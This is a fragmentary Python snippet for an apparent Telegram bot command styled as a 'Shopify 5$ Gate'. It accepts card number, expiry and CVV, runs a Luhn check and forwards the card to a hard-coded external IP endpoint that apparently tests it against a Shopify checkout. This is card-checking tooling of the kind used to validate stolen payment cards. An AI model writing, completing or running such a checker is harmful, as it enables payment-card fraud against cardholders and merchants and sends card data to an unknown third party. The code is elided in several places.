...
API_URL = "http://72.61.18.119:7009/shopify?cc={cc}&site=https://example.com"
...
async def hc_command(message: types.Message):
    ...
    if not args:
        await message.reply(
            "💳 <b>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝟱$ 𝗚𝗮𝘁𝗲</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📟 𝗖𝗼𝗺𝗺𝗮𝗻𝗱: <code>/hc</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 𝗨𝘀𝗮𝗴𝗲: <code>/hc CC|MM|YY|CVV</code>\n\n"
            "📝 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: <code>/hc 4111111111111111|12|25|123</code>",
            parse_mode="HTML"
        )
        return
    ...
    if not luhn_check(cc):
        await message.reply("❌ <b>𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗖𝗮𝗿𝗱</b>", parse_mode="HTML")
        return
    ...
    try:
        ...
        if resp.status_code == 200:
            ...
            final_status = f"⚠️ 𝗘𝗥𝗥𝗢𝗥 (HTTP {resp.status_code})"
